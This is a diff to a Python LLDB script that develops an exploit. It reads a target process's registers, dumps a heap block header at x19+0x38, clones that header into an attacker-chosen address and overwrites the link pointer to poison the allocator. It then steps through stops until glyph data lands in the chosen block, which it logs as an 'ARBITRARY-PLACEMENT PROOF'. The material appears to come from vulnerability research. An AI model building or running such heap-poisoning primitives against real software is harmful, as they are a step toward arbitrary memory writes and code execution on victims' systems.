@@ -42,52 +42,61 @@ def stop5():
         if x19: break
     return p, x19, x27, (bpe, bpw)
 
-# P1: link-scan recon
+# P1: link-scan recon + block-header layout dump
 p, x19, x27, bps = stop5()
 if not p:
     T("P1 launchfail"); TRACE.close(); sys.exit(0)
 T("P1 x19=%x x27=%x" % (x19, x27))
 qs = qwords(p, x19, 64)
-links = [(j*8, hex(q)) for j, q in enumerate(qs or []) if 0x100000000 <= q < 0x800000000000]
-T("P1 x19 links: %s" % links)
+T("P1 x19 qwords: %s" % [hex(q) for q in (qs or [])])
+nxt = qs[7] if qs and len(qs) > 7 else 0   # x19+0x38
+if 0x100000000 <= nxt < 0x800000000000:
+    hdr = qwords(p, nxt, 16)
+    T("P1 block@(x19+0x38)=%x header: %s" % (nxt, [hex(q) for q in (hdr or [])]))
 cleanup(bps); p.Kill()
 
-# P3 (primary): poison first link slot -> chosen block -> glyph data lands
+# P3: poison x19+0x38 -> cloned-block at chosen address; sweep stops for pop
 p, x19, x27, bps = stop5()
 if not p or not x19:
     T("P3 nox19"); cleanup(bps); TRACE.close(); sys.exit(0)
-qs = qwords(p, x19, 64)
-slot = None
-for j, q in enumerate(qs or []):
-    if 0x100000000 <= q < 0x800000000000:
-        slot = x19 + j*8; break
-if slot is None:
-    slot = x19  # fallback: head slot even if empty
+qs = qwords(p, x19, 16)
+orig_next = qs[7]
+T("P3 x19=%x orig_next(+0x38)=%x" % (x19, orig_next))
 blk = (x27 - 0x4000) + 0x100
-wr(p, blk, bytes(0x200))  # zero landing zone
-oldslot = qwords(p, slot, 1)
-wr(p, slot, struct.pack('<Q', blk))
-T("P3 poison slot=%x (was %s) -> blk=%x" % (slot, hex(oldslot[0]) if oldslot else "?", blk))
+# clone the original next-block header (0x100) into blk for plausibility
+if 0x100000000 <= orig_next < 0x800000000000:
+    hdr = p.ReadMemory(orig_next, 0x100, err)
+    if err.Success() and hdr:
+        wr(p, blk, hdr)
+        T("P3 cloned header %x -> blk %x" % (orig_next, blk))
+else:
+    wr(p, blk, bytes(0x100))
+wr(p, x19 + 0x38, struct.pack('<Q', blk))
+T("P3 poison x19+0x38 -> blk=%x" % blk)
 for b in bps:
     if b and b.GetID() != bps[1].GetID(): t.BreakpointDelete(b.GetID())
 bps[1].SetOneShot(False)
-p.Continue()
-st = p.GetState()
-while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
-if st == lldb.eStateStopped:
-    data = p.ReadMemory(blk, 0x80, err)
+landed = False
+for stop in range(8):
+    p.Continue()
+    st = p.GetState()
+    while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
+    if st != lldb.eStateStopped:
+        T("P3 exited at stop %d rc=%s" % (stop, p.GetExitStatus())); break
+    data = p.ReadMemory(blk + 0x100, 0x80, err)  # body after cloned header
     if err.Success() and data:
         nz = sum(1 for b in data if b)
-        T("P3 BLOCK-CONTENT: nonzero=%d/128 first16=%s" % (nz, data[:16].hex()))
         if nz:
-            T("P3 DATA-IN-CHOSEN-BLOCK = ARBITRARY-PLACEMENT PROOF ✅")
+            T("P3 stop%d BLOCK-BODY nonzero=%d/128 first16=%s" % (stop, nz, data[:16].hex()))
+            T("P3 DATA-IN-CHOSEN-BLOCK = ARBITRARY-PLACEMENT PROOF")
+            landed = True
+            break
+        else:
+            T("P3 stop%d body zero; slot now=%s" % (stop, hex(qwords(p, x19+0x38, 1)[0])))
     else:
-        T("P3 read fail")
-    now = qwords(p, slot, 1)
-    T("P3 slot now: %s (consumed=%s)" % (hex(now[0]) if now else "?", now and now[0] != blk))
-    p.Kill()
-else:
-    T("P3 exited rc=%s" % p.GetExitStatus())
-cleanup(bps)
+        T("P3 stop%d read fail" % stop)
+if not landed:
+    T("P3 no pop observed in window")
+p.Kill(); cleanup(bps)
 T("RIP-20 DONE")
 TRACE.close()
